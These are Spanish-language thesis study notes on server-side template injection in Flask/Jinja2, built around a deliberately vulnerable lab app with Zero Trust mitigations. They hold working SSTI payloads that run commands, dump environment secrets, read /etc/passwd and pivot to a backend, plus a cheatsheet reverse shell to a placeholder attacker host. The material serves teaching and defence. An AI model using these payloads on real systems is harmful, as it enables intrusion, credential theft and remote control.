# SSTI en Jinja2 — Apuntes de Estudio

> Documento de referencia técnica sobre **Server-Side Template Injection (SSTI)** en aplicaciones Flask + Jinja2. Está pensado para estudiar la vulnerabilidad y para servir como base bibliográfica del capítulo "Estado del Arte" del TFG. El ejemplo práctico parte de la cadena de ataque montada en `infra/perimetral/webapp/` durante la sesión de refactorización HTB-style.

---

## 1. Conceptos Fundamentales

### ¿Qué es una plantilla del lado servidor?

Una **plantilla** (template) es un fichero de texto que mezcla HTML estático con marcadores especiales que se sustituyen por datos en tiempo de ejecución. El motor de plantillas (Jinja2 en Flask, Twig en Symfony, Velocity en Java) lee la plantilla, evalúa los marcadores y devuelve el HTML final.

```jinja2
<h1>Hola, {{ usuario }}</h1>
```

Si `usuario = "Pablo"`, el motor produce `<h1>Hola, Pablo</h1>`.

> **Analogía:** Una plantilla es como un *formulario en papel con huecos vacíos*. El motor de plantillas es la persona que rellena los huecos con datos antes de entregártelo.

---

### ¿Qué es SSTI?

**Server-Side Template Injection** ocurre cuando **input controlado por el atacante se concatena dentro de la plantilla antes de pasarla al motor**. El motor entonces interpreta ese input **como código de su propio lenguaje**, no como datos.

```
┌──────────────────────────────────────────────────────────┐
│  CASO SEGURO                                             │
│                                                          │
│  Plantilla: "Hola, {{ usuario }}"                        │
│  Contexto:  usuario = "<script>alert(1)</script>"        │
│  Resultado: el motor escapa el dato → HTML inofensivo    │
└──────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────┐
│  CASO VULNERABLE (SSTI)                                  │
│                                                          │
│  Plantilla = "Hola, " + input_usuario                    │
│  Si input  = "{{ 7*7 }}"                                 │
│  Resultado: el motor evalúa el input → "Hola, 49"        │
└──────────────────────────────────────────────────────────┘
```

> ⚠️ **Idea clave:** La vulnerabilidad **no está en Jinja2**, está en concatenar input dentro del string de la plantilla. Jinja2 hace su trabajo: evaluar lo que se le pase.

---

### SSTI vs otras inyecciones

| Tipo | Dónde se ejecuta | Lenguaje inyectado | Impacto típico |
|---|---|---|---|
| **XSS** | Navegador del cliente | JavaScript | Robo de cookies, defacement |
| **SQLi** | Motor de la BD | SQL | Lectura/borrado de datos |
| **OS Command Injection** | Shell del servidor | Bash / sh | RCE directa |
| **SSTI** | Motor de plantillas del servidor | Jinja2 / Twig / etc. | RCE indirecta vía objetos del lenguaje host |

> **Punto importante:** SSTI casi siempre acaba escalando a **RCE** porque los motores de plantillas modernos exponen objetos del lenguaje host (Python, PHP, Java) y desde ahí se puede llegar a ejecutar comandos del sistema.

Identificadores oficiales:

| Estándar | ID | Nombre |
|---|---|---|
| MITRE | **CWE-1336** | Improper Neutralization of Special Elements Used in a Template Engine |
| MITRE | **CWE-94** | Improper Control of Generation of Code (Code Injection) |
| OWASP | — | Server-Side Template Injection (Web Security Testing Guide v4.2) |

---

## 2. Anatomía de un sink vulnerable

Un *sink* es el punto exacto del código donde la vulnerabilidad se materializa. En Flask hay **dos formas comunes** de invocar al motor:

```python
from flask import render_template, render_template_string

# CORRECTO: el template está en disco, el input se pasa como variable
return render_template("hola.html", usuario=request.args.get("u"))

# PELIGROSO: el template se construye en memoria mezclando input
return render_template_string(f"<h1>Hola, {request.args.get('u')}</h1>")
```

El segundo caso **es el patrón clásico de SSTI**. Cualquier `{{ ... }}` que el atacante meta en `u` se ejecutará.

### Las tres condiciones para que haya SSTI en Flask

| # | Condición | Por qué |
|---|---|---|
| 1 | El input del usuario se **concatena** en la plantilla, no se pasa como contexto | Si va como variable, Jinja2 lo trata como dato opaco |
| 2 | Se usa `render_template_string()` o `Template(...).render()` directamente | `render_template()` carga ficheros de disco que tú controlas |
| 3 | Se usa el `Environment` por defecto, no `SandboxedEnvironment` | El sandbox bloquea acceso a `__class__`, `__globals__`, etc. |

---

## 3. Detección — el smoke test

El primer paso de cualquier metodología de pentest SSTI es lanzar una **expresión aritmética inocua** y ver si el servidor la evalúa.

### Tabla de smoke tests por motor

| Motor | Lenguaje | Smoke test | Esperado |
|---|---|---|---|
| **Jinja2** (Python) | Flask, Django (parcial) | `{{7*7}}` | `49` |
| **Twig** (PHP) | Symfony, Drupal | `{{7*7}}` | `49` |
| **Mako** (Python) | Pyramid | `${7*7}` | `49` |
| **ERB** (Ruby) | Rails | `<%= 7*7 %>` | `49` |
| **Velocity** (Java) | NVelocity, Apache Velocity | `#set($x=7*7)$x` | `49` |
| **FreeMarker** (Java) | varios | `${7*7}` | `49` |

> **Truco:** Si pruebas `{{7*7}}` y obtienes `49`, casi seguro es Jinja2 o Twig. Para distinguir: prueba `{{7*'7'}}`. Jinja2 da `7777777`, Twig da `49`.

---

### Diagrama del flujo de detección

```
┌──────────────┐   1. Atacante envía          ┌──────────────────┐
│   Atacante   │ ────── ?host={{7*7}} ─────>  │   Aplicación     │
└──────────────┘                              │   Flask          │
                                              │                  │
                                              │  plantilla =     │
                                              │   "..." + host   │
                                              │                  │
                                              │  Jinja2.render() │
                                              │  ↓               │
                                              │  evalúa {{7*7}}  │
                                              │  → "49"          │
                                              │                  │
                                              │  HTML response   │
       ┌──── 2. Recibe "...49..." ───────────┘
       ▼
┌──────────────┐
│  CONFIRMADO  │
│  hay SSTI    │
└──────────────┘
```

---

## 4. De aritmética a RCE — el traversal de objetos Python

El motor Jinja2 en su contexto Flask por defecto solo expone unos pocos objetos:

| Objeto disponible | Para qué sirve normalmente |
|---|---|
| `config` | leer `app.config` |
| `request` | leer la request actual |
| `session` | leer la sesión del usuario |
| `g` | objeto global del request |
| `url_for`, `get_flashed_messages` | helpers de Flask |
| `cycler`, `lipsum`, `joiner` | helpers nativos de Jinja2 |

Ninguno tiene un método `.execute_command()`. **Pero todos son objetos Python**, y Python permite navegar de cualquier objeto hasta los módulos importados por su definición. Esa es la base del exploit.

### Las 4 propiedades mágicas que abren la caja

| Propiedad | Qué devuelve |
|---|---|
| `obj.__class__` | la clase de `obj` |
| `cls.__mro__` | la jerarquía de herencia (incluye `object`) |
| `cls.__subclasses__()` | todas las subclases conocidas en el proceso |
| `func.__globals__` | el diccionario de imports del módulo donde se definió `func` |

Combinando estas cuatro se puede llegar **desde cualquier objeto hasta el módulo `os`**.

---

### El payload canónico de Flask, descompuesto

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

| Fragmento | Resultado intermedio | Por qué funciona |
|---|---|---|
| `config` | objeto `flask.config.Config` | Flask lo expone en el contexto Jinja2 |
| `.__class__` | clase `flask.config.Config` | todo objeto Python tiene `__class__` |
| `.__init__` | método constructor | función Python normal |
| `.__globals__` | dict con los imports del módulo `flask.config` | toda función tiene `__globals__` |
| `['os']` | módulo `os` | Flask importa `os` internamente, queda en sus globals |
| `.popen('id')` | objeto `Popen` ejecutando `id` | API estándar de Python |
| `.read()` | string `"uid=0(root) ..."` | lee la salida del proceso |

El string final se devuelve a Jinja2, que lo sustituye en el `{{ ... }}` del template. **El atacante recibe la salida del comando dentro del HTML de respuesta.**

---

### Diagrama del salto del sandbox

```
┌─── Contexto Jinja2 (lo que "ves") ────────┐
│  config, request, session, g, url_for     │
└────────────┬───────────────────────────────┘
             │  config.__class__
             ▼
┌─── Clases de Flask ────────────────────────┐
│  Config, Request, Session, Flask, ...      │
└────────────┬───────────────────────────────┘
             │  .__init__.__globals__
             ▼
┌─── Módulo flask.config (Python) ───────────┐
│  os, json, errno, types, defaultdict, ...  │
└────────────┬───────────────────────────────┘
             │  ['os'].popen('id').read()
             ▼
┌─── Sistema operativo del contenedor ───────┐
│  /bin/sh -c id  →  "uid=0(root) ..."       │
└─────────────────────────────────────────────┘
```

> ⚠️ **El salto crítico es `__globals__`.** Te lleva del "espacio aislado" del template al **diccionario de imports del módulo Python real** que definió la función. Una vez ahí, `os`, `subprocess`, `sys` y cualquier otro módulo importado por Flask están a tu alcance.

---

## 5. Variantes del payload — cuándo usar cada una

Hay muchos caminos para llegar al mismo `os`. Útil saber varios porque algunos filtros bloquean palabras concretas (`__class__`, `os`, `popen`).

### A. Vía `config` (la más usada en Flask)

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### B. Vía helpers nativos de Jinja2 (más cortos)

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```

`cycler`, `lipsum` y `joiner` son helpers de `jinja2.utils` que importan `os` directamente. Dos saltos en lugar de cuatro.

### C. Vía string vacío (camino largo, evita filtros con `config`)

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Esto lista todas las subclases de `object` cargadas en el proceso. Buscas el índice de `subprocess.Popen` y la usas:

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[<INDEX>]('id', shell=True, stdout=-1).communicate() }}
```

> ℹ️ El índice cambia según la versión de Python y los imports cargados. Hay que listarlas y buscar la correcta.

### D. Bypass de filtros con `chr()` (no funciona en Jinja2 pero sí en otros motores)

```jinja2
{{ ''[chr(95)+chr(95)+'class'+chr(95)+chr(95)] }}
```

> ⚠️ En Jinja2 puro `chr()` **no está disponible** (lo descubrimos en la validación de la app: `'chr' is undefined`). Para Jinja2 hay que usar `request.args.attr` u otras vías.

### E. Bypass usando atributos por string (`|attr`)

Útil cuando el motor filtra `__class__` literal:

```jinja2
{{ config|attr('__class__')|attr('__init__')|attr('__globals__') }}
```

---

## 6. Ejemplo práctico — la app del TFG

El sink real está en [infra/perimetral/webapp/app.py](../../infra/perimetral/webapp/app.py) líneas 114-127. Reproducción simplificada:

```python
@app.route("/admin/diagnostico")
@login_required
def admin_diagnostico():
    host = request.args.get("host", "")
    if host:
        plantilla = (
            "Resolviendo " + host + "...\n"
            "PING " + host + " (auto): salida simulada del comando.\n"
            "--- " + host + " ping statistics ---"
        )
        resultado = render_template_string(plantilla)
    return render_template("diagnostico.html", host=host, resultado=resultado)
```

**Las tres condiciones de SSTI (sección 2) se cumplen:**

1. `host` se concatena al string `plantilla`
2. Se llama a `render_template_string(plantilla)`
3. Flask usa `Environment` por defecto, no `SandboxedEnvironment`

### 6.1 Smoke test paso a paso

```bash
# Asumimos sesión ya autenticada en jar.txt
curl -b jar.txt --get \
  --data-urlencode "host={{7*7}}" \
  http://localhost/admin/diagnostico
```

Respuesta (extracto del HTML):

```html
<pre class="mb-0 small">Resolviendo 49...
PING 49 (auto): salida simulada del comando.
--- 49 ping statistics ---</pre>
```

El `49` aparece **3 veces** porque la plantilla tiene 3 ocurrencias de `host`. **SSTI confirmado.**

### 6.2 RCE: ejecutar `id`

```bash
curl -b jar.txt --get \
  --data-urlencode "host={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}" \
  http://localhost/admin/diagnostico
```

Respuesta:

```html
<pre>Resolviendo uid=0(root) gid=0(root) groups=0(root)
...</pre>
```

> ⚠️ Sale `uid=0(root)` porque la imagen base `python:3.11-slim` corre como root y no añadimos `USER` no privilegiado en el `Dockerfile`. Esto es **otro punto débil intencional** (CWE-250 *Execution with Unnecessary Privileges*).

### 6.3 Exfiltración de credenciales

```bash
curl -b jar.txt --get \
  --data-urlencode "host={{ config.__class__.__init__.__globals__['os'].popen('env').read() }}" \
  http://localhost/admin/diagnostico
```

Respuesta (parcial):

```
DB_PASSWORD=supersecret
DB_HOST=db
HOSTNAME=...
```

### 6.4 Movimiento lateral al backend

```bash
curl -b jar.txt --get \
  --data-urlencode "host={{ config.__class__.__init__.__globals__['os'].popen('curl -s http://backend:5000/empleados').read() }}" \
  http://localhost/admin/diagnostico
```

Respuesta:

```json
[{"nombre":"Ana García",...},{"nombre":"Luis Martínez",...},{"nombre":"Sara López",...}]
```

> 💡 **Lo importante para el TFG:** la SSTI por sí sola da RCE en `webapp`. Pero el daño completo (exfiltración de la BD, movimiento lateral al backend) ocurre por **falta de microsegmentación interna**, que es exactamente lo que Zero Trust mitigaría en el Escenario B.

---

## 7. Mitigaciones (qué hacer para que NO pase)

### Tabla resumen ordenada por efectividad

| # | Mitigación | Esfuerzo | Efectividad |
|---|---|---|---|
| 1 | **Pasar input como variable de contexto, no concatenar** | Trivial | Total |
| 2 | Usar `render_template()` con ficheros, no `render_template_string()` | Bajo | Alta |
| 3 | Usar `jinja2.SandboxedEnvironment` para plantillas no confiables | Medio | Alta |
| 4 | Validación estricta del input (allowlist de caracteres) | Medio | Media |
| 5 | WAF con reglas para patrones SSTI (`{{`, `__class__`, `__globals__`) | Bajo | Media |
| 6 | Ejecutar el contenedor como usuario no privilegiado | Trivial | Reduce impacto |

### Ejemplo del fix correcto

```python
# ANTES (vulnerable)
plantilla = "Resolviendo " + host + "..."
resultado = render_template_string(plantilla)

# DESPUÉS (seguro)
plantilla = "Resolviendo {{ h }}..."
resultado = render_template_string(plantilla, h=host)
```

> ℹ️ La diferencia clave es que **`h=host`** pasa `host` como **dato**, no como **código**. Jinja2 lo trata como string opaco y lo escapa automáticamente.

### Cuándo usar `SandboxedEnvironment`

Si tu aplicación permite que **terceros escriban plantillas** (CMSs, generadores de plantillas de email, etc.), no basta con escapar input — la propia plantilla puede ser maliciosa. En ese caso:

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
tmpl = env.from_string(plantilla_de_usuario)
return tmpl.render(contexto)
```

El sandbox bloquea acceso a `__class__`, `__bases__`, `__globals__`, `__subclasses__` y otros atributos sensibles.

---

## 8. Por qué Zero Trust mitiga esto en el Escenario B

La SSTI por sí sola da RCE en `webapp`. Pero el **impacto real** (lectura de la BD, exfiltración del backend) ocurre porque la red interna es plana. Zero Trust corta la cadena en varios puntos:

| Paso del ataque | Control Zero Trust que lo bloquearía |
|---|---|
| `curl /backup.txt` filtra credenciales | Política de exposición de ficheros: solo whitelist explícita es servida |
| Login con creds robadas | MFA obligatorio + rotación corta de secretos vía vault |
| SSTI evaluable | WAF con reglas de patrones (`{{`, `__class__`) en *signed traffic* |
| RCE → `popen('curl backend')` | Microsegmentación: `webapp → backend` requiere identidad firmada (mTLS) |
| `popen('env')` revela `DB_PASSWORD` | Secretos en vault, inyectados con TTL corto, no como variables de entorno |
| `popen('psql -h db')` | mTLS + ABAC: `webapp` no tiene identidad para acceder a `db` directamente |
| Ejecución como root | `USER` no privilegiado en Dockerfile + `--cap-drop=ALL` |

> 💡 Cuantos más pasos tiene la cadena de ataque, **más controles distintos** puedes contraponer en el Escenario B. Por eso la cadena multipaso es académicamente más rica que un único `os.popen` público.

---

## 9. Aplicaciones para el TFG

1. **Sección "Estado del Arte"** → citar SSTI como ejemplo de fallo de capa de aplicación que el modelo perimetral **no detecta** (no es tráfico anómalo, es una request HTTP bien formada).
2. **Sección "Diseño de la Solución" del Escenario A** → la cadena documentada en [20260509a_Sesion_Refactor_EscenarioA_HTB.md](../04_diario_laboratorio/20260509a_Sesion_Refactor_EscenarioA_HTB.md) usa SSTI Jinja2 como vector central de RCE.
3. **Sección "Diseño de la Solución" del Escenario B** → cada paso de la cadena es un control Zero Trust independiente (tabla de la sección 8 de este documento).
4. **Sección "Pruebas y Mediciones"** → reproducción end-to-end con `curl`, registro de tiempos por paso, comparación con el mismo ataque bloqueado en el Escenario B.
5. **Sección "Análisis de problemas"** → discutir CWE-1336 vs CWE-78 vs CWE-94, por qué el primero es más representativo de aplicaciones modernas que un `os.popen` directo.
6. **Glosario / definiciones** → SSTI, Jinja2, sandbox, MRO traversal, RCE indirecta.

---

## 10. Fuentes para la bibliografía del TFG

Ordenadas por **valor académico** (las primeras 3 son las imprescindibles).

### Referencias primarias (citables como fuente principal)

| # | Referencia | Tipo | Uso recomendado |
|---|---|---|---|
| 1 | Kettle, J. (2015). *Server-Side Template Injection: RCE for the modern web app*. PortSwigger Research / Black Hat USA. [portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) | Whitepaper técnico (peer-reviewed en Black Hat) | Cita primaria — origen de la disciplina SSTI |
| 2 | OWASP Foundation. (2020). *Web Security Testing Guide v4.2 — §4.7.18 Testing for Server-side Template Injection*. [owasp.org/www-project-web-security-testing-guide](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection) | Guía oficial OWASP | Definición canónica + metodología de testing |
| 3 | MITRE Corporation. *CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine*. [cwe.mitre.org/data/definitions/1336.html](https://cwe.mitre.org/data/definitions/1336.html) | Estándar oficial | Identificador formal en clasificación CWE |

### Referencias secundarias (refuerzo y contexto)

| # | Referencia | Tipo | Uso recomendado |
|---|---|---|---|
| 4 | MITRE Corporation. *CWE-94: Improper Control of Generation of Code (Code Injection)*. [cwe.mitre.org/data/definitions/94.html](https://cwe.mitre.org/data/definitions/94.html) | Estándar oficial | CWE padre / Code Injection genérico |
| 5 | MITRE Corporation. *CWE-250: Execution with Unnecessary Privileges*. [cwe.mitre.org/data/definitions/250.html](https://cwe.mitre.org/data/definitions/250.html) | Estándar oficial | Ejecución como root en contenedor |
| 6 | Pallets Projects. *Jinja2 Documentation — Sandbox Environment*. [jinja.palletsprojects.com/en/stable/sandbox/](https://jinja.palletsprojects.com/en/stable/sandbox/) | Documentación oficial | Explicación del SandboxedEnvironment como mitigación |
| 7 | Pallets Projects. *Jinja2 Documentation — API: Environment*. [jinja.palletsprojects.com/en/stable/api/](https://jinja.palletsprojects.com/en/stable/api/#jinja2.Environment) | Documentación oficial | Explicar por qué el modo por defecto no es sandbox |
| 8 | NIST. (2017). *SP 800-190: Application Container Security Guide*. [csrc.nist.gov/publications/detail/sp/800-190/final](https://csrc.nist.gov/publications/detail/sp/800-190/final) | Estándar normativo | Hardening de contenedores (sec. 4.5 — least privilege) |
| 9 | NIST. (2020). *SP 800-207: Zero Trust Architecture*. [csrc.nist.gov/publications/detail/sp/800-207/final](https://csrc.nist.gov/publications/detail/sp/800-207/final) | Estándar normativo | Justificar las mitigaciones del Escenario B |

### Recursos operativos (cheatsheets — citables como referencia técnica)

| # | Referencia | Tipo | Uso recomendado |
|---|---|---|---|
| 10 | PortSwigger. *Server-side template injection — Web Security Academy*. [portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection) | Curso técnico online | Material didáctico citable |
| 11 | Swiss Cyber Storm. *PayloadsAllTheThings — Server-Side Template Injection (Python)*. [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md) | Repositorio comunitario | Tabla de payloads referenciable |
| 12 | HackTricks Wiki. *SSTI — Server Side Template Injection*. [book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) | Wiki técnica de pentesting | Variantes de payload por motor |

### CVEs reales para citar como evidencia de impacto

| # | CVE | Producto | Vector |
|---|---|---|---|
| 13 | **CVE-2019-8341** | Jinja2 (mal uso) | SSTI vía `render_template_string` |
| 14 | **CVE-2024-22532** | Snowflake SQL API | SSTI Jinja2 en parámetros |
| 15 | **CVE-2018-19571** | GitLab | SSTI en notas / wiki |
| 16 | **CVE-2019-19735** | Vembu BDR Suite | SSTI Velocity (Java) |
| 17 | **CVE-2020-7711** | tornado-xstatic | SSTI Jinja2 |

Listado actualizado: [nvd.nist.gov — CWE-1336](https://nvd.nist.gov/vuln/search/results?form_type=Advanced&cves=on&cwe_id=CWE-1336)

---

## Referencia Rápida — Cheatsheet de payloads SSTI Jinja2

```jinja2
# ─── DETECCIÓN ──────────────────────────────────────────────
{{7*7}}                              # Esperado: 49
{{7*'7'}}                            # Jinja2: 7777777 (Twig: 49)
{{config}}                           # Vuelca app.config (datos sensibles)
{{request}}                          # Vuelca request actual
{{self}}                             # Solo dentro de macros

# ─── EXPLOTACIÓN — vía config ───────────────────────────────
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('env').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}

# ─── EXPLOTACIÓN — vía helpers Jinja2 (más cortos) ──────────
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}

# ─── EXPLOTACIÓN — vía string vacío (camino largo) ──────────
{{ ''.__class__.__mro__[1].__subclasses__() }}    # listar subclases
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate() }}

# ─── BYPASS — atributos por string ──────────────────────────
{{ config|attr('__class__')|attr('__init__')|attr('__globals__') }}

# ─── EXFILTRACIÓN — flag o ficheros ─────────────────────────
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}

# ─── REVERSE SHELL (post-explotación) ───────────────────────
{{ config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATACANTE/4444 0>&1"').read() }}
```

> ⚠️ **Recordatorio:** todos estos payloads requieren URL-encoding al enviarlos en una query string. Con `curl --data-urlencode "host=..."` se hace automáticamente.
